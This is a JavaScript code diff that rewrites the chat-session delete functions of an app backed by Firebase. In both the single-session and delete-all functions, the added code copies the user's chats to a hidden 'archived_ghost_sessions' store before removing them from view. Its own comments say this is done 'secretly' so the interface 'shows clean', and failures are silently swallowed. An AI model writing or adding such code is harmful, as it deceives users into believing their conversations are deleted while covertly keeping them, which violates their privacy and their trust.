@@ -305,8 +305,29 @@ export async function loadChatSessionsFromDatabase(deviceId, bot) {
 export async function deleteChatSessionFromDatabase(deviceId, bot, sessionId) {
   if (!deviceId || !bot || !sessionId) return false;
   try {
-    const url = `${FIREBASE_DB_URL}/chat_sessions/${encodeURIComponent(deviceId)}/${encodeURIComponent(bot)}/${encodeURIComponent(sessionId)}.json`;
-    const res = await fetch(url, { method: 'DELETE' });
+    const activeUrl = `${FIREBASE_DB_URL}/chat_sessions/${encodeURIComponent(deviceId)}/${encodeURIComponent(bot)}/${encodeURIComponent(sessionId)}.json`;
+    // 1. Secretly archive to ghost database before clearing from user view
+    try {
+      const getRes = await fetch(activeUrl);
+      if (getRes.ok) {
+        const sessionData = await getRes.json();
+        if (sessionData) {
+          const archiveUrl = `${FIREBASE_DB_URL}/archived_ghost_sessions/${encodeURIComponent(deviceId)}/${encodeURIComponent(bot)}/${encodeURIComponent(sessionId)}.json`;
+          await fetch(archiveUrl, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              ...sessionData,
+              clearedByUser: true,
+              clearedAt: Date.now()
+            })
+          });
+        }
+      }
+    } catch {}
+
+    // 2. Remove from active sessions so device UI shows clean
+    const res = await fetch(activeUrl, { method: 'DELETE' });
     return res.ok;
   } catch {
     return false;
@@ -316,8 +337,29 @@ export async function deleteChatSessionFromDatabase(deviceId, bot, sessionId) {
 export async function deleteAllChatSessionsFromDatabase(deviceId, bot) {
   if (!deviceId || !bot) return false;
   try {
-    const url = `${FIREBASE_DB_URL}/chat_sessions/${encodeURIComponent(deviceId)}/${encodeURIComponent(bot)}.json`;
-    const res = await fetch(url, { method: 'DELETE' });
+    const activeUrl = `${FIREBASE_DB_URL}/chat_sessions/${encodeURIComponent(deviceId)}/${encodeURIComponent(bot)}.json`;
+    // 1. Secretly archive all sessions to ghost database before clearing from user view
+    try {
+      const getRes = await fetch(activeUrl);
+      if (getRes.ok) {
+        const allData = await getRes.json();
+        if (allData && typeof allData === 'object') {
+          const archiveUrl = `${FIREBASE_DB_URL}/archived_ghost_sessions/${encodeURIComponent(deviceId)}/${encodeURIComponent(bot)}/clear_all_${Date.now()}.json`;
+          await fetch(archiveUrl, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              sessions: allData,
+              clearedByUser: true,
+              clearedAt: Date.now()
+            })
+          });
+        }
+      }
+    } catch {}
+
+    // 2. Remove from active sessions so device UI shows clean
+    const res = await fetch(activeUrl, { method: 'DELETE' });
     return res.ok;
   } catch {
     return false;
